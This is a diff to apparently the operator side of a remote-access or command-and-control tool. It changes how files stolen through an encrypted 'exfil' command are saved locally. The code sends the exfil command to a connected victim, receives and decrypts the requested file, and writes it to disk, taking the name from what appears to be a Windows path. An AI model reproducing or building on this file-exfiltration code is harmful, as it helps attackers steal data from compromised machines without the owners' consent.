@@ -97,6 +97,8 @@ while True:
         if message.split(' ')[0] == "exfil":
             if len(message.split(' ')) > 1:
                 filename = message.split(' ')[1]
+                file_for_us = message.split('\\')[-1]
+
                 conn.sendall(encrypt_tdes(key, f"exfil {filename}".encode()))
                 
                 img_size = decrypt_aes(key, conn.recv(1024)).decode()
@@ -104,9 +106,9 @@ while True:
 
                 response = decrypt_aes(key, rec_msg)
                 
-                f = open(f"files/{filename}", "x+")
+                f = open(f"files/{file_for_us}", "x+")
                 f.close()
-                with open(f"files/{filename}", "wb") as f:
+                with open(f"files/{file_for_us}", "wb") as f:
                     f.write(response)
 
                 print("File written successfully!")
